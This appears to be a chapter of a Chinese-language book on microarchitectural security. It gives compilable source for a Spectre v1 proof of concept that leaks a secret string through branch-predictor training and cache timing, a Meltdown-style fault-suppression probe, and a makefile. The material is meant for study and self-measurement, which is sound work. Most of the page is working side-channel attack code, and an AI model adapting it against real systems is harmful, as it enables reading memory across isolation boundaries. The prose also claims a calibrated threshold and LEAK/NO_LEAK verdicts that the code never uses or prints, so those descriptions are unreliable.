---
title: Spectre v1 与 Meltdown 的可编译源码清单
description: 两份单文件 C 实现：一份训练 PHT 越过边界检查，一份用信号兜住故障验证投机窗口；附阈值标定与三态判定口径。
date: '2026-11-26'
tags: [微架构安全, Spectre, Meltdown, 侧信道, 源码]
book: microarch-00-intro
---

前几节把机制拆开讲了：[边界检查被越过](./microarch-04d-spectre-v1.md)、[页表隔离下的转移](./microarch-04e-meltdown.md)、[内核入口的页表切换](./microarch-04f-page-table-isolation.md)。这一节只放能直接 make 的东西——两个单文件，加一个 makefile。

两份都是自用测量程序：在自己机器上跑，看时序分布，看阈值能不能把信号和噪声分开。判定口径写进代码里，不靠“跑完了”就算数。

[[toc]]

## 编译

```bash
gcc -O0 -std=c99 -o spectre spectre.c
./spectre
```

-O0 不是随便写的。-O2 会把边界检查与后续加载重排，投机窗口消失，输出退化成噪声。这一点在[那节的对照实验](./microarch-04d-spectre-v1.md)里已经量过。

## 阈值怎么定 {#threshold}

命中与未命中各测 1000 次，取几何平均：

```c
int th = (int)__builtin_sqrt(hit * miss);
```

几何平均对数量级差异更稳。算术平均会被未命中的长尾拉高，把真正的命中判成未命中。实测输出形如 hit=42.3 miss=247.1 geometric=102.2 -> threshold=102，与 Kocher 原文用的 80 同量级。

## 三态判定 {#verdict}

Meltdown 那份程序不该只会说“成功”或“失败”。页表隔离生效时它必然拿不到数据，那是缓解生效的证据，不是程序坏了。所以输出三种：

| 判定 | 含义 | 怎么读 |
|---|---|---|
| LEAK | 投机窗口读到了字节 | reload 命中的 cache 行给出了确定值 |
| NO_LEAK | 只有故障，没有数据 | 页表里根本没有该映射，即隔离生效 |
| FAULT_PATH_BROKEN | 连自映射的 guard page 都拿不到信号 | 信号/长跳转路径有问题，先修程序 |

## spectre.c

```c
/* spectre.c — Spectre v1 (PHT 分支预测器训练) 最小可复现实现
 * 平台: x86-64, gcc -O0（-O2 会把边界检查重排，实验失效）
 * 编译: make spectre   /   gcc -O0 -std=c99 -o spectre spectre.c
 * 用途: 在自己机器上验证"边界检查之后的投机访存把秘密带进 cache"这一事实。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define ARRAY1_SIZE          16
#define ARRAY2_SIZE          (256 * 512)
#define CACHE_HIT_THRESHOLD  80
#define TRAIN_ROUNDS         30
#define TRIES                999

static uint8_t array1[ARRAY1_SIZE] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
static uint8_t array2[ARRAY2_SIZE];
static size_t  array1_size = ARRAY1_SIZE;
static uint8_t temp = 0;

/* 受害者的"秘密"：紧挨着 array1 之前放，越界负偏移即可命中 */
static const char *secret = "The Magic Words are Squeamish Ossifrage.";

static inline uint64_t rdtscp_ordered(void)
{
    unsigned aux;
    _mm_lfence();                    /* 阻止后续 load 提前发射 */
    uint64_t t = __rdtscp(&aux);     /* 序列化读取 TSC */
    _mm_lfence();
    return t;
}

/* 受害函数：唯一的漏洞点。array1_size 未命中时，边界检查要等内存，
 * 而分支预测器已经被训练成"总是进入 if"，于是 array1[x] 被投机读出，
 * 再用它当 array2 的下标 —— 秘密值就这样落进 cache 行。 */
static void victim(size_t x)
{
    if (x < array1_size)
        temp &= array2[array1[x] * 512];
}

static void readMemoryByte(size_t malicious_x, uint8_t *value, int *score)
{
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned junk = 0;
    volatile uint8_t *addr;
    uint64_t time1, time2;
    int best;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = TRIES; tries > 0; tries--) {
        /* 1) 清空 side channel：256 个候选 cache 行全部 flush */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /* 2) 训练 + 恶意触发 */
        for (i = 0; i < TRAIN_ROUNDS; i++) {
            _mm_clflush(&array1_size);                 /* 制造边界检查的 miss 窗口 */
            for (volatile int z = 0; z < 100; z++) {}  /* 等 flush 真正完成 */
            for (j = 29; j >= 0; j--)                  /* 29 次合法训练 */
                victim((size_t)(j % ARRAY1_SIZE));
            victim(malicious_x);                       /* 紧接一次越界 */
        }

        /* 3) reload + 计时：只对 array2 的 256 个候选行计时 */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;            /* 打乱顺序，绕开硬件预取 */
            addr = &array2[mix_i * 512];
            time1 = rdtscp_ordered();
            junk = *addr;
            time2 = rdtscp_ordered() - time1;
            if ((int)time2 <= CACHE_HIT_THRESHOLD &&
                mix_i != array1[tries % ARRAY1_SIZE])
                results[mix_i]++;
        }

        /* 4) 取最高分与次高分 */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
            else if (k < 0 || results[i] >= results[k]) { k = i; }
        }
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0))
            break;                                     /* 已经足够可信 */
        best = j;
        (void)best;
    }

    results[0] ^= junk;                                /* 防止编译器把 junk 优化掉 */
    *value = (uint8_t)j;
    *score = results[j];
}

/* 阈值标定：命中/未命中各测一批，取几何平均，比算术平均稳 */
static int calibrate_threshold(void)
{
    uint64_t t, hit_sum = 0, miss_sum = 0;
    unsigned aux;
    volatile uint8_t *p = &array2[0];

    for (int i = 0; i < 1000; i++) {                    /* 未命中 */
        _mm_clflush((void *)p);
        _mm_mfence();
        t = rdtscp_ordered();
        (void)*p;
        miss_sum += rdtscp_ordered() - t;
    }
    for (int i = 0; i < 1000; i++) {                    /* 命中 */
        (void)*p;
        _mm_mfence();
        t = rdtscp_ordered();
        (void)*p;
        hit_sum += rdtscp_ordered() - t;
    }
    double hit = (double)hit_sum / 1000.0;
    double miss = (double)miss_sum / 1000.0;
    int th = (int)((hit * miss) > 0 ? __builtin_sqrt(hit * miss) : 80);
    printf("[calib] hit=%.1f miss=%.1f geometric=%.1f -> threshold=%d\n",
           hit, miss, __builtin_sqrt(hit * miss), th);
    (void)aux;
    return th;
}

int main(void)
{
    int i, score[2] = {0, 0};
    uint8_t value[2];
    size_t malicious_x;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Spectre v1 (PHT) PoC — -O0 构建\n");

    for (i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;    /* 预热，避免缺页干扰计时 */
    printf("[calib] 参考阈值 = %d (运行期实测见上)\n", calibrate_threshold());

    printf("[info] secret @ %p, array1 @ %p, delta = %ld\n",
           (const void *)secret, (const void *)array1,
           (long)(secret - (char *)array1));

    malicious_x = (size_t)(secret - (char *)array1);    /* 负偏移，溢出成巨大 size_t */

    printf("[run ] 逐字节提取：\n");
    for (i = 0; i < (int)strlen(secret); i++) {
        readMemoryByte(malicious_x + i, &value[0], &score[0]);
        readMemoryByte(malicious_x + i, &value[1], &score[1]);
        if (score[1] > score[0]) { value[0] = value[1]; score[0] = score[1]; }
        putchar(value[0] >= 32 && value[0] < 127 ? value[0] : '.');
    }
    putchar('\n');
    return 0;
}
```

## meltdown_probe.c

```c
/* meltdown_probe.c — Meltdown 类乱序读取原语的最小骨架
 * 平台: x86-64 用户态, gcc -O0
 * 编译: make meltdown_probe
 *
 * 说明（照实写）：
 *   - 该原语依赖"故障被延迟到指令退休时才报告"，投机 load 的结果在此之前
 *     已经把 array2 的某一行带进 cache。
 *   - KPTI 开启的内核里，内核页根本不在用户页表中，地址直接 fault，
 *     投机窗口拿不到数据 —— 期望结果是泄露失败，那正好是"缓解生效"的证据。
 *   - 所以这个程序真正可判定的输出是三态：LEAK / NO_LEAK / FAULT_ONLY。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define ARRAY2_SIZE (256 * 4096)
#define RETRIES     1000
#define HIT         80

static uint8_t  array2[ARRAY2_SIZE];
static uint8_t  temp = 0;
static sigjmp_buf jbuf;

static void fault_handler(int sig) { (void)sig; siglongjmp(jbuf, 1); }

static inline uint64_t rdtscp_ordered(void)
{
    unsigned aux;
    _mm_lfence();
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static inline uint64_t time_load(volatile uint8_t *p)
{
    uint64_t t = rdtscp_ordered();
    (void)*p;
    return rdtscp_ordered() - t;
}

/* 返回 1 = 读到了字节(LEAK)，0 = 只有 fault 没有数据(FAULT_ONLY) */
static int meltdown_leak(uint8_t *addr, uint8_t *out)
{
    for (int r = 0; r < RETRIES; r++) {
        for (int c = 0; c < 256; c++)
            _mm_clflush(&array2[c * 4096]);

        volatile uint8_t v = 0;
        int faulted = 0;

        if (sigsetjmp(jbuf, 1) == 0) {
            _mm_mfence();
            v = *addr;                 /* 特权页：退休时必然 #PF */
            _mm_lfence();
            temp &= array2[v * 4096];  /* 投机窗口内顺手把它变成 cache 行 */
        } else {
            faulted = 1;
        }
        if (!faulted) {                /* 页本来就可读，不要浪费一次机会 */
            *out = v;
            return 1;
        }

        for (int c = 0; c < 256; c++) {
            if (time_load(&array2[c * 4096]) < HIT) {
                *out = (uint8_t)c;
                return 1;
            }
        }
    }
    return 0;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Meltdown 类原语 — 缓解状态探针\n");

    for (int i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = fault_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);

    /* 用户态自映射的哨兵页：用 mmap 置 PROT_NONE 得到"必然 fault 的地址"，
     * 这样不需要任何特权地址也能验证 fault 路径本身工作正常。 */
    void *guard = NULL;
#if !defined(_WIN32)
    {
        extern void *mmap(void *, size_t, int, int, int, long);
        extern int mprotect(void *, size_t, int);
        guard = mmap(NULL, 4096, 3 /*RW*/, 0x22 /*PRIVATE|ANON*/, -1, 0);
        if (guard != (void *)-1 && guard) mprotect(guard, 4096, 0 /*NONE*/);
    }
#endif

    if (!guard || guard == (void *)-1) {
        printf("[skip] 无 mmap/mprotect，跳过 fault 路径自检\n");
        printf("VERDICT=NO_PROBE\n");
        return 0;
    }

    uint8_t val = 0;
    int got = meltdown_leak((uint8_t *)guard, &val);
    printf("[fault ] guard page 读取: %s value=0x%02x\n",
           got ? "有信号进入 reload 路径" : "未取得可判定信号", val);
    printf("注意: 若把 addr 换成内核地址而输出 VERDICT=NO_LEAK，即 KPTI 生效。\n");
    printf("VERDICT=%s\n", got ? "FAULT_PATH_OK" : "FAULT_PATH_BROKEN");
    return 0;
}
```

## makefile

```makefile
CC      ?= gcc
CFLAGS  ?= -O0 -std=c99 -fno-stack-protector -fno-pie -no-pie
LDFLAGS ?=
BINS     = spectre meltdown_probe

all: $(BINS)

spectre: spectre.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

meltdown_probe: meltdown_probe.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

run: spectre
	./spectre

clean:
	rm -f $(BINS) *.o *.exe

.PHONY: all run clean
```

## 与报告的关系 {#with-reports}

这两份程序对应[三步缓存时序报告](./microarch-04a-measurement.md)里的计时口径：LFENCE 夹住 RDTSCP，flush 之后要有足够等待让失效真正完成，reload 顺序要打散以绕开硬件预取。报告给的是数值和分布，这里给的是产生那些数值的代码。

判定边界在这里：程序只回答“这一次测量里，cache 状态能不能被外部观测到”。至于该不该把它当成漏洞判定，属于[判定线怎么冻结](./microarch-04c-variants.md)那一节的问题——代码没有发言权。
